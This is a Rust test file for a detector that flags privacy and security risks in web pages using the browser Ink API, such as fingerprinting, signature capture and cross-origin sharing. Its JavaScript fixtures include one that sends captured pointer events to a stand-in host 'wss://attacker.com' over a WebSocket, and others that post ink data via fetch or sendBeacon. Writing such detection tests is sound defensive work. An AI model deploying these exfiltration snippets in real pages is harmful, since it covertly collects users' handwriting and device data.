use crate::ink_api_audit::*;

#[test]
fn no_ink_no_issues() {
    assert!(analyze_ink_api("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_navigator_ink() {
    let body = r#"<script>const presenter = await navigator.ink.requestPresenter({});</script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::ApiDetected));
}

#[test]
fn detects_api_ink_presenter() {
    let body = r#"<script>if (window.InkPresenter) {}</script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::ApiDetected));
}

#[test]
fn detects_input_tracking() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        canvas.addEventListener("pointermove", (e) => p.updateInkTrailStartPoint(e));
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::InputTracking));
}

#[test]
fn no_tracking_without_events() {
    let body = r#"<script>const p = await navigator.ink.requestPresenter({});</script>"#;
    let issues = analyze_ink_api(body);
    assert!(!issues.contains(&InkApiIssue::InputTracking));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        fetch("/collect", {body: JSON.stringify(points)});
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        console.log(p);
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(!issues.contains(&InkApiIssue::DataExfiltration));
}

#[test]
fn detects_continuous_capture() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        requestAnimationFrame(function draw() {
            ctx.stroke();
            requestAnimationFrame(draw);
        });
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::ContinuousCapture));
}

#[test]
fn detects_canvas_fingerprinting() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({presentationArea: canvas});
        const data = canvas.toDataURL();
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(issues.contains(&InkApiIssue::CanvasFingerprinting));
}

#[test]
fn no_fingerprint_without_canvas_export() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({presentationArea: canvas});
    </script>"#;
    let issues = analyze_ink_api(body);
    assert!(!issues.contains(&InkApiIssue::CanvasFingerprinting));
}

#[test]
fn severity_exfil_highest() {
    assert_eq!(ink_api_severity(&InkApiIssue::DataExfiltration), 6.5);
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(ink_api_severity(&InkApiIssue::ApiDetected), 2.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![InkApiIssue::ApiDetected, InkApiIssue::InputTracking];
    let mut seq = 0;
    let ops = ink_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(InkApiIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(InkApiIssue::InputTracking.to_string(), "input_tracking");
    assert_eq!(
        InkApiIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        InkApiIssue::ContinuousCapture.to_string(),
        "continuous_capture"
    );
    assert_eq!(
        InkApiIssue::CanvasFingerprinting.to_string(),
        "canvas_fingerprinting"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_ink_api("").is_empty());
}

// New security analysis tests

#[test]
fn security_no_ink_no_issues() {
    assert!(analyze_ink_api_security("<html><body>hello</body></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_ink_api_security("").is_empty());
}

#[test]
fn detects_ink_fingerprinting_with_device_pixel_ratio() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const dpr = window.devicePixelRatio;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkFingerprinting));
}

#[test]
fn detects_ink_fingerprinting_with_screen_dimensions() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const w = screen.width, h = screen.height;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkFingerprinting));
}

#[test]
fn detects_ink_fingerprinting_with_hardware_concurrency() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const cores = navigator.hardwareConcurrency;
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkFingerprinting));
}

#[test]
fn no_fingerprinting_without_device_info() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkFingerprinting));
}

#[test]
fn detects_ink_data_exfiltration_with_coalesced_events() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const events = e.getCoalescedEvents();
        fetch("/collect", {body: JSON.stringify(events)});
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkDataExfiltration));
}

#[test]
fn detects_ink_data_exfiltration_with_predicted_events() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const predicted = e.getPredictedEvents();
        sendBeacon("/track", JSON.stringify(predicted));
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkDataExfiltration));
}

#[test]
fn detects_ink_data_exfiltration_with_xhr() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const events = e.getCoalescedEvents();
        const xhr = new XMLHttpRequest();
        xhr.send(events);
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkDataExfiltration));
}

#[test]
fn detects_ink_data_exfiltration_with_websocket() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const events = e.getCoalescedEvents();
        const ws = new WebSocket("wss://attacker.com");
        ws.send(JSON.stringify(events));
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkDataExfiltration));
}

#[test]
fn no_exfiltration_without_network_calls() {
    let body = r#"<script>
        const events = e.getCoalescedEvents();
        console.log(events);
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkDataExfiltration));
}

#[test]
fn detects_ink_without_permission() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        p.updateInkTrailStartPoint(e);
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkWithoutPermission));
}

#[test]
fn no_permission_issue_with_permissions_check() {
    let body = r#"<script>
        await navigator.permissions.query({name: 'ink'});
        const p = await navigator.ink.requestPresenter({});
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkWithoutPermission));
}

#[test]
fn detects_ink_in_iframe_with_postmessage() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        parent.postMessage(inkData, "*");
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkInIframe));
}

#[test]
fn detects_ink_in_iframe_with_iframe_element() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const iframe = document.createElement('iframe');
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkInIframe));
}

#[test]
fn detects_ink_in_iframe_with_parent_reference() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        parent.someFunction();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkInIframe));
}

#[test]
fn no_iframe_issue_without_cross_origin() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkInIframe));
}

#[test]
fn detects_ink_signature_capture() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        document.getElementById('signature').textContent = 'sign here';
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkSignatureCapture));
}

#[test]
fn detects_ink_signature_with_handwriting() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const handwriting = captureStrokes();
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkSignatureCapture));
}

#[test]
fn detects_ink_signature_with_autograph() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const autograph = getInkData();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkSignatureCapture));
}

#[test]
fn no_signature_without_keywords() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const data = getData();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkSignatureCapture));
}

#[test]
fn detects_ink_pressure_tracking() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        canvas.addEventListener('pointermove', (e) => {
            const pressure = e.pressure;
        });
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPressureTracking));
}

#[test]
fn detects_ink_pressure_with_force() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const force = pointerEvent.force;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPressureTracking));
}

#[test]
fn detects_ink_pressure_with_tangential_pressure() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const tangentialPressure = e.tangentialPressure;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPressureTracking));
}

#[test]
fn detects_ink_cross_origin_sharing_with_postmessage() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        window.postMessage(inkData, "https://other.com");
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkCrossOriginSharing));
}

#[test]
fn detects_ink_cross_origin_with_broadcast_channel() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const bc = new BroadcastChannel('ink-channel');
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkCrossOriginSharing));
}

#[test]
fn detects_ink_cross_origin_with_shared_worker() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const worker = new SharedWorker('worker.js');
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkCrossOriginSharing));
}

#[test]
fn no_cross_origin_without_sharing_mechanism() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const data = processLocally();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkCrossOriginSharing));
}

#[test]
fn detects_ink_persistent_storage_with_localstorage() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        localStorage.setItem('ink', JSON.stringify(data));
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPersistentStorage));
}

#[test]
fn detects_ink_persistent_storage_with_sessionstorage() {
    let body = r#"<script>
        if (window.InkPresenter) {
            sessionStorage.setItem('strokes', data);
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPersistentStorage));
}

#[test]
fn detects_ink_persistent_storage_with_indexeddb() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const db = indexedDB.open('inkDB');
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPersistentStorage));
}

#[test]
fn detects_ink_persistent_storage_with_websql() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const db = openDatabase('ink', '1.0', 'Ink Data', 2 * 1024 * 1024);
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkPersistentStorage));
}

#[test]
fn no_persistent_storage_without_apis() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const temp = storeInMemory();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkPersistentStorage));
}

#[test]
fn detects_ink_timing_attack_with_performance_now() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const t = performance.now();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkTimingAttack));
}

#[test]
fn detects_ink_timing_attack_with_date_now() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const t = Date.now();
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkTimingAttack));
}

#[test]
fn detects_ink_timing_attack_with_timestamp() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const ts = e.timestamp;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkTimingAttack));
}

#[test]
fn detects_ink_timing_attack_with_time_origin() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        const origin = performance.timeOrigin;
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkTimingAttack));
}

#[test]
fn no_timing_attack_without_timing_apis() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
        processData();
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkTimingAttack));
}

#[test]
fn detects_ink_with_canvas() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({presentationArea: canvas});
        const ctx = canvas.getContext('2d');
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkWithCanvas));
}

#[test]
fn detects_ink_with_offscreen_canvas() {
    let body = r#"<script>
        if (window.InkPresenter) {
            const canvas = new OffscreenCanvas(800, 600);
            const ctx = canvas.getContext('2d');
        }
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(issues.contains(&InkApiSecurityIssue::InkWithCanvas));
}

#[test]
fn no_canvas_issue_without_canvas_api() {
    let body = r#"<script>
        const p = await navigator.ink.requestPresenter({});
    </script>"#;
    let issues = analyze_ink_api_security(body);
    assert!(!issues.contains(&InkApiSecurityIssue::InkWithCanvas));
}

#[test]
fn security_severity_data_exfiltration_highest() {
    assert_eq!(
        ink_api_security_severity(&InkApiSecurityIssue::InkDataExfiltration),
        7.5
    );
}

#[test]
fn security_severity_signature_capture_high() {
    assert_eq!(
        ink_api_security_severity(&InkApiSecurityIssue::InkSignatureCapture),
        7.0
    );
}

#[test]
fn security_severity_fingerprinting_medium_high() {
    assert_eq!(
        ink_api_security_severity(&InkApiSecurityIssue::InkFingerprinting),
        6.5
    );
}

#[test]
fn security_severity_without_permission_lowest() {
    assert_eq!(
        ink_api_security_severity(&InkApiSecurityIssue::InkWithoutPermission),
        3.0
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        InkApiSecurityIssue::InkFingerprinting,
        InkApiSecurityIssue::InkDataExfiltration,
    ];
    let mut seq = 0;
    let ops = ink_api_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_vector() {
    let issues: Vec<InkApiSecurityIssue> = vec![];
    let mut seq = 42;
    let ops = ink_api_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 42);
}

#[test]
fn security_display_ink_fingerprinting() {
    assert_eq!(
        InkApiSecurityIssue::InkFingerprinting.to_string(),
        "ink_fingerprinting"
    );
}

#[test]
fn security_display_ink_data_exfiltration() {
    assert_eq!(
        InkApiSecurityIssue::InkDataExfiltration.to_string(),
        "ink_data_exfiltration"
    );
}

#[test]
fn security_display_ink_without_permission() {
    assert_eq!(
        InkApiSecurityIssue::InkWithoutPermission.to_string(),
        "ink_without_permission"
    );
}

#[test]
fn security_display_ink_in_iframe() {
    assert_eq!(
        InkApiSecurityIssue::InkInIframe.to_string(),
        "ink_in_iframe"
    );
}

#[test]
fn security_display_ink_signature_capture() {
    assert_eq!(
        InkApiSecurityIssue::InkSignatureCapture.to_string(),
        "ink_signature_capture"
    );
}

#[test]
fn security_display_ink_pressure_tracking() {
    assert_eq!(
        InkApiSecurityIssue::InkPressureTracking.to_string(),
        "ink_pressure_tracking"
    );
}

#[test]
fn security_display_ink_cross_origin_sharing() {
    assert_eq!(
        InkApiSecurityIssue::InkCrossOriginSharing.to_string(),
        "ink_cross_origin_sharing"
    );
}

#[test]
fn security_display_ink_persistent_storage() {
    assert_eq!(
        InkApiSecurityIssue::InkPersistentStorage.to_string(),
        "ink_persistent_storage"
    );
}

#[test]
fn security_display_ink_timing_attack() {
    assert_eq!(
        InkApiSecurityIssue::InkTimingAttack.to_string(),
        "ink_timing_attack"
    );
}

#[test]
fn security_display_ink_with_canvas() {
    assert_eq!(
        InkApiSecurityIssue::InkWithCanvas.to_string(),
        "ink_with_canvas"
    );
}
